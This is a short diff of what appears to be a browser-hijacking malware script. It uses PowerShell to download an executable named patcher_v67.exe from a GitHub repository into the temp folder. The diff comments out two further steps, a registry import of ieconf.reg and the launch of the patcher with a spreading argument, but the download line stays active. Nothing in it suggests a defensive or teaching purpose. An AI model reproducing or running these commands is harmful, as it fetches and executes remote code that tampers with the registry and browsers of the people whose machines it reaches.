@@ -5,8 +5,8 @@ powershell -command "&{(new-object System.Net.WebClient).DownloadFile('https://r
 powershell -command "&{(new-object System.Net.WebClient).DownloadFile('https://github.com/icesonata/Browser-Hijacking/blob/main/patcher_v67.exe?raw=true', '`"$env:temp/patcher.exe`"');}"
 
 # Import reg file into registry
-powershell -command "&{reg import $env:temp\\ieconf.reg}"
+#powershell -command "&{reg import $env:temp\\ieconf.reg}"
 
 # Execute patching file
-powershell -command "&{. $env:temp\\patcher.exe --spread (Get-Item .).FullName}"
+#powershell -command "&{. $env:temp\\patcher.exe --unlease (Get-Item .).FullName}"
 
